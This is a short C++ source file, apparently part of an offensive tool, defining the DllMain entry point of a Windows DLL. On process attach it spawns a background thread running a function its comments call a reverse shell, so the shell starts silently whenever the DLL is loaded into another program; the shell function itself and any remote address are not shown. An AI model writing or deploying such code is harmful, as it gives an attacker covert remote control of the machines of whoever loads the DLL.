// dllmain.cpp : Definiuje punkt wejścia dla aplikacji DLL.
#include "pch.h"
#include "rev.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        /*Basic blocking revshell*/
        //asdf(0);
        /*Creating Thread to execute Revese Shell without blocking execution of a program*/
        /*Based on: https://stackoverflow.com/questions/48809595/how-to-create-threads-in-dlls-c */
        HANDLE thread_handle;
        DWORD thread_id;
        thread_handle = CreateThread(0, 0, asdf, 0, 0, &thread_id);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

